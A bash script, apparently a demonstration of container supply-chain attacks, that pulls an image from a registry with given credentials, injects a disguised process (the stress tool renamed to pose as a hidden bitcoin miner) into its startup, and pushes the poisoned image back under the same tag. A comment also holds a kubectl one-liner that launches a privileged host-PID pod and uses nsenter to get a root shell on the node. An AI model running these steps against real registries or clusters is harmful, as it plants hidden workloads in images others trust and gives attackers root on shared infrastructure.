#!/bin/bash -e

# It's expected that this command will be run like this:
#kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"ubuntu","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'

[[ -z "$1" ]] && { echo "Must supply the image" ; exit 1; }
IMAGE=$1
echo "IMAGE =" $IMAGE
[[ -z "$2" ]] && { echo "Must supply the docker registry username" ; exit 1; }
REGISTRY_USERNAME=$2
echo "REGISTRY_USERNAME = " $REGISTRY_USERNAME
[[ -z "$3" ]] && { echo "Must supply the docker registry username" ; exit 1; }
REGISTRY_PASSWORD=$3
echo "REGISTRY_PASSWORD = " $REGISTRY_PASSWORD

REGISTRY_HOSTNAME=$(echo $IMAGE | cut -d/ -f1)
echo "REGISTRY_HOSTNAME = " $REGISTRY_HOSTNAME

# Install buildah
apt update
apt install -y buildah

echo buildah login --username "$REGISTRY_USERNAME" --password "$REGISTRY_PASSWORD" "$REGISTRY_HOSTNAME"
buildah login --username "$REGISTRY_USERNAME" --password "$REGISTRY_PASSWORD" "$REGISTRY_HOSTNAME"
echo "Successfully logged in to $REGISTRY_HOSTNAME"

# Clear the cache
buildah rmi $IMAGE
buildah pull $IMAGE

# Get the command from the image
IMAGE_CMD=$(buildah inspect $IMAGE | jq '.Docker.config.Cmd | join(" ")' -r)
echo $IMAGE_CMD

# Shhh...don't tell anyone, but our bitcoin miner is actually stress
apt install -y stress
cp /usr/bin/stress /tmp/moneymoneymoney

cat > /tmp/startup.sh << EOF
echo "Starting up the app.  Totally nothing else!"
/moneymoneymoney --cpu 1 &
$IMAGE_CMD
EOF

echo "startup.sh:"
cat /tmp/startup.sh

# Create a new Dockerfile
cat > /tmp/Dockerfile<< EOF
FROM $IMAGE

ADD ./moneymoneymoney /
ADD ./startup.sh /

CMD ["sh", "/startup.sh"]
EOF

echo "Dockerfile:"
cat /tmp/Dockerfile

buildah build -t $IMAGE /tmp
echo "Successfully built new image ($IMAGE)"

buildah push $IMAGE $ACR_NAME
echo "Successfully pushed $IMAGE to $REGISTRY_HOSTNAME"
